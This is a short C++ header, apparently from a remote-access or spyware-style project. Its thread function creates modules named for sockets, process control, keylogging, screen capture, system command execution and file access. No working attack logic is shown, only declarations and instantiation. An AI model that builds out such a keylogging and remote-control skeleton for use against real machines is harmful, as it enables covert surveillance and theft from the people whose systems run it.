#pragma once

#include "addon.h"

extern addonThread* gThread;
extern addonMutex* gMutex;
addonSocket* gSocket;
addonProcess* gProcess;
addonKeylog* gKeylog;
addonScreen* gScreen;
addonSysexec* gSysexec;
addonFS* gFS;





DWORD _stdcall main_thread(LPVOID lpParam)
{
	gSocket = new addonSocket();
	gProcess = new addonProcess();
	gKeylog = new addonKeylog();
	gScreen = new addonScreen();
	gSysexec = new addonSysexec();
	gFS = new addonFS();

	return 1;
}